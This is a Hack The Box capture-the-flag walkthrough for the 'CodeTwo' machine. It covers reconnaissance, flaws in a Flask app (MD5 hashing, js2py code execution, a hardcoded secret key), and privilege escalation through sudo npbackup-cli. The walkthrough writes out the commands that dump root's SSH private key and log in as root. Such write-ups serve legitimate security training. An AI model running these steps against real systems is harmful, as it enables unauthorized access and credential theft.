---
title: CodeTwo — HTB
author: Radeel Ahmad
pubDatetime: 2025-08-17T10:39:00Z
tags:
  - hacking
  - HTB
  - Flask
  - js2py
  - npbackup
description:
  Hack The Box "CodeTwo" walkthrough — downloading a Flask app's source via an exposed app.zip endpoint to reveal MD5-hashed credentials, a js2py remote code execution flaw, and a hardcoded secret key, then abusing an unprotected npbackup-cli backup repository to exfiltrate root's SSH private key.
---

### CodeTwo — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**CodeTwo**'.

![](/blog/images/htb/1*Fc5cp9bkUfm51Cpt_HJqJA.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Desktop/HTB/CodeTwo]
└─$ nmap -sC -sV 10.10.11.82
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 10:39 UTC
Nmap scan report for 10.10.11.82
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.60 seconds
```

Update `etc/host(s)`:

```
10.10.11.82 codetwo.htb
```

Open Website on **Port 8000**

![](/blog/images/htb/1*Uz1LkLEIFBMpsDto4aKaGg.png)

Download the APP, and we see that there is a database file named `user.db`

```
┌──(kali㉿kali)-[~/Desktop/HTB/CodeTwo/app]
└─$ ls
app.py
instance
requirements.txt
static
templates
┌──(kali㉿kali)-[~/Desktop/HTB/CodeTwo/app]
└─$ cd instance
┌──(kali㉿kali)-[~/…/HTB/CodeTwo/app/instance]
└─$ ls
users.db
```

Opening it in SQLite Browser shows that the database contains usernames and passwords, which we cannot access directly.

![](/blog/images/htb/1*Lcw_eJNJefVe3H2PfFq-aw.png)

- Weak Password Hashing (MD5)

`password_hash = hashlib.md5(password.encode()).hexdigest()`

- JS Code Execution via js2py (Remote Code Execution)

`result = js2py.eval_js(code)`

- Direct File Download

`send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)`

- Session Issues

`app.secret_key = 'S3cr3tK3yC0d3Tw0'`

```
┌──(kali㉿kali)-[~/Desktop/HTB/CodeTwo/app]
└─$ cat app.py
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json
```

```
js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3Tw0'
app
──── (371 lines hidden) ────
nal_labels: {}
no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

- The tool (`npbackup-cli`) will **back up `/root/.ssh/id_rsa`** — the root user's private SSH key — into the repository at `/home/marco/repo`.
- The repository is **protected only with `repo_password: "nopass"`**, which is basically no protection at all.

```
┌──(kali㉿kali)-[~/Desktop/HTB/CodeTwo]
└─$ cat root.conf
conf_version: 3.0.1
```

```
repos:
  default:
    repo_uri: /home/marco/repo
    repo_group: default_group
    repo_opts:
      repo_password: "nopass"

groups:
  default_group:
    backup_opts:
      paths:
        - /root/.ssh/id_rsa
    source_type: folder_list
```

- The first command triggers the backup process.
- The second command uses the `-dump` option to extract `/root/.ssh/id_rsa` from the repository.

```
marco@codetwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c root.conf --backup
marco@codetwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c root.conf --dump /root/.ssh/id_rsa
```

---

### Privilege Escalation

### Root Flag:

```
┌──(kali㉿kali)-[~/Desktop/HTB/CodeTwo]
└─$ ssh -i id_rsa root@codetwo.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
```

```
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

System information as of Sun 17 Aug 2025 12:32:44 PM UTC

  System load:           0.0
  Usage of /:            62.5% of 5.08GB
  Memory usage:          36%
  Swap usage:            0%
  Processes:             258
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.82
  IPv6 address for eth0: dead:beef::250:56ff:fe95:d9f4

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
Last login: Sun Aug 17 12:32:45 2025 from 10.10.14.25
root@codetwo:~# cat root.txt
e4098919fcdc27*********
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
